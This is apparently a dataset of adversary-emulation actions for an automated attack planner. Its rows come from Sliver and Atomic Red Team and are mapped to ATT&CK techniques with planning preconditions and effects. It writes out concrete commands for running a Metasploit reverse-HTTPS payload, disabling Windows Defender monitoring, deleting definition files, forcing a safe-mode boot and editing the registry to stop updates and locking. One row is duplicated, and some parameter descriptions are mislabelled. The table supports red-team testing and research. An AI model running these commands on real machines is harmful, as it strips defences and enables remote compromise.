| 861580a4-aad7-4269-94ea-43f3f775423d | Metasploit Payload Execution using Sliver | \['T1203'\] | Sliver | \['windows', 'linux', 'macos'\] | \['Execution'\] | \['Exploitation for Client Execution'\] | The command is used within a Sliver session to execute a Metasploit payload in the current process. It allows users to specify various options such as the encoder type, number of encoding iterations, listening host and port, payload type, and command timeout. By default, it uses the "meterpreter_reverse_https" payload, listens on port 4444, and has a timeout of 60 seconds. This command is typically used for penetration testing and security assessments to deploy payloads on target systems. | {'executor': 'Sliver Executor', 'command': 'msf(#{SessionID}, #{Payload}, #{LHOST}, #{LPORT})\n'} | {'SessionID': {'default': None, 'description': 'The session ID of the active Sliver connection.', 'type': None}, 'Payload': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}} | \[{'operator': 'or', 'operands': \['(os_windows ?t - host)', '(os_linux ?t - host)', '(os_macos ?t - host)'\]}, '(sliver_session ?s - executor ?t - host)'\] | \['(MSF_payload_execution ?p - payload ?t - host)'\] |
| 861580a4-aad7-4269-94ea-43f3f775423d | Metasploit Payload Execution using Sliver | \['T1203'\] | Sliver | \['windows', 'linux', 'macos'\] | \['Execution'\] | \['Exploitation for Client Execution'\] | The command is used within a Sliver session to execute a Metasploit payload in the current process. It allows users to specify various options such as the encoder type, number of encoding iterations, listening host and port, payload type, and command timeout. By default, it uses the "meterpreter_reverse_https" payload, listens on port 4444, and has a timeout of 60 seconds. This command is typically used for penetration testing and security assessments to deploy payloads on target systems. | {'executor': 'Sliver Executor', 'command': 'msf(#{SessionID}, #{Payload}, #{LHOST}, #{LPORT})\n'} | {'SessionID': {'default': None, 'description': 'The session ID of the active Sliver connection.', 'type': None}, 'Payload': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LHOST': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}, 'LPORT': {'default': None, 'description': 'IP address of the attacker machine', 'type': None}} | \[{'operator': 'or', 'operands': \['(os_windows ?t - host)', '(os_linux ?t - host)', '(os_macos ?t - host)'\]}, '(sliver_session ?s - executor ?t - host)'\] | \['(MSF_payload_execution ?p - payload ?t - host)'\] |
| 7bfba376-cebc-4094-b1e6-5103b2e83c4e | Execute PowerShell Command | \['T1059.001'\] | Sliver | \['windows'\] | \['Execution'\] | \['Command and Scripting Interpreter: PowerShell\n'\] | The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine. | {'executor': 'Sliver Executor', 'command': 'powershell(#{SessionID},#{Commands})'} | {'SessionID': {'description': 'The session ID of the active Sliver connection.'}} | \['(os_windows ?t - host)', '(sliver_session ?s1 - executor ?t - host)'\] | \['(powershell ?s2 - executor ?t - host)', {'operator': 'When', 'params': {'condition': '(elevated_executor ?s1 - executor)', 'effect': '(elevated_executor ?s2 - executor)'}}\] |
| 6b8df440-51ec-4d53-bf83-899591c9b5d7 | Tamper with Windows Defender ATP PowerShell | \['T1562.001'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Impair Defenses: Disable or Modify Tools'\] | Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled<br>in Windows settings.<br> | {'executor': 'Elevated Powershell Executor', 'command': 'Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n'} | None | \['(powershell ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(virus_and_threat_protection_disabled ?target - host)'\] |
| 2a78362e-b79a-4482-8e24-be397bce4d85 | Safe Mode Boot | \['T1562.009'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Impair Defenses: Safe Mode Boot'\] | Allows adversaries to abuse safe mode to disable endpoint defenses that may not start with limited boot | {'executor': 'Elevated Command Prompt Executor', 'command': 'bcdedit /set safeboot network'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(endpoint_defense_disabled ?target - host)'\] |
| 01b20ca8-c7a3-4d86-af59-059f15ed5474 | Disable Windows OS Auto Update | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(auto_update_disabled ?target - host)'\] |
| 3dacb0d2-46ee-4c27-ac1b-f9886bf91a56 | Disable Windows Lock Workstation Feature | \['T1112'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Modify Registry'\] | Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.<br>See how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/<br> | {'executor': 'Elevated Command Prompt Executor', 'command': 'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(lock_workstation_disabled ?target - host)'\] |
| 3d47daaa-2f56-43e0-94cc-caf5d8d52a68 | Remove Windows Defender Definition Files | \['T1562.001'\] | ART | \['windows'\] | \['Defense Evasion'\] | \['Impair Defenses: Disable or Modify Tools'\] | Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.<br>On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the<br>command will say completed.<br><br>https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/<br> | {'executor': 'Elevated Command Prompt Executor', 'command': '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -RemoveDefinitions -All\n'} | None | \['(command_prompt ?executor - executor ?target - host)', '(elevated_executor ?executor - executor)', '(os_windows ?target - host)'\] | \['(anti_malware_disabled ?target - host)'\] |